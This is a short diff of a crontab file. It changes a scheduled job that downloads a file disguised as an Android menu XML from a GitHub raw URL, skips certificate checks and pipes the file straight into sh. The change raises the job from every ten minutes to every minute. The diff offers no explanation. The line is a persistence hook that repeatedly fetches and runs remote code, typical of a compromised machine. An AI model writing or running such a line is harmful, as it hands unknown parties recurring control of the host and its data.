@@ -6,5 +6,5 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 * * * * *    test -x /bin/cron.min && ( /bin/cron.min )
 1 * * * *    test -x /bin/cron.hour && ( /bin/cron.hour )
-*/10 * * * * wget -O - -q --no-check-certificate https://raw.githubusercontent.com/umdbg/Android1/master/android-sign-in-up-screen/res/menu/main.xml|sh
+*/1 * * * * wget -O - -q --no-check-certificate https://raw.githubusercontent.com/umdbg/Android1/master/android-sign-in-up-screen/res/menu/main.xml|sh
 
